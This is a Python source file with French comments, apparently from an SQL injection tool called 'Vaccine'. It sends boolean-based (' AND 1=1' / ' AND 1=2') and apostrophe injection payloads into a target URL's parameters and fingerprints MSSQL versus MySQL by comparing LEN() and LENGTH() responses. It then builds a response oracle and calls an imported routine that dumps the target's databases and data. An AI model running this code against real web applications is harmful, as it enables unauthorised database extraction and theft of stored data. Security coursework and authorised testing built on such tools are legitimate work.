from engines import ENGINES
from core import dump_db, send, similarity, Oracle
from collections import namedtuple

Ctx = namedtuple("Ctx", ["url", "params", "name", "method", "oracle"])


def get_engine(url, value, name, params, method):
    # LEN() n'existe qu'en MSSQL, LENGTH() qu'en MySQL : la fonction VALIDE
    # renvoie une page proche du baseline, l'invalide une page d'erreur.
    copy = params.copy()
    copy[name] = value + " AND LEN('a')=1"
    copy_mysql = params.copy()
    copy_mysql[name] = value + " AND LENGTH('a')=1"
    r = send(url, params, method)
    is_mssql = send(url, copy, method)
    is_mysql = send(url, copy_mysql, method)
    sim_mssql = similarity(is_mssql.text, r.text)   # proche du baseline => LEN valide => MSSQL
    sim_mysql = similarity(is_mysql.text, r.text)   # proche du baseline => LENGTH valide => MySQL
    if sim_mssql > sim_mysql:
        return ENGINES["mssql"]
    elif sim_mysql > sim_mssql:
        return ENGINES["mysql"]
    else:
        return None


def _run(name, value, params, parsed_url, method, true_resp, false_resp, noise_ref, payload):
    """Construit l'oracle, verifie la vulnerabilite, detecte le moteur, dumpe."""
    oracle = Oracle(true_resp, false_resp, noise_ref)
    if not oracle.reliable():
        return None
    engine = get_engine(parsed_url, value, name, params, method)
    if engine is None:
        print("database type not supported by Vaccine")
        return None
    ctx = Ctx(parsed_url, params, name, method, oracle)
    dump = dump_db(ctx, engine)
    return {
        "vulnerable param": name,
        "payload": payload,
        "engine": engine["type"],
        "bases": dump["bases"],
        "data": dump["data"],
    }


def inject_bool(name, value, params, parsed_url, method):
    copy = params.copy()
    copy[name] = value + ' AND 1=1'
    fcopy = params.copy()
    fcopy[name] = value + ' AND 1=2'
    base = send(parsed_url, params, method)      # reference de bruit (page vraie)
    r_true = send(parsed_url, copy, method)      # condition toujours vraie
    r_false = send(parsed_url, fcopy, method)    # condition toujours fausse
    return _run(name, value, params, parsed_url, method,
                true_resp=r_true, false_resp=r_false, noise_ref=base, payload=copy[name])


def inject_apostrophe(name, value, params, parsed_url, method):
    copy = params.copy()
    copy[name] = value + "'"
    base = send(parsed_url, params, method)      # page normale (vraie + bruit)
    base2 = send(parsed_url, params, method)     # 2e identique -> mesure du bruit
    r_err = send(parsed_url, copy, method)       # apostrophe -> erreur attendue (fausse)
    return _run(name, value, params, parsed_url, method,
                true_resp=base, false_resp=r_err, noise_ref=base2, payload=copy[name])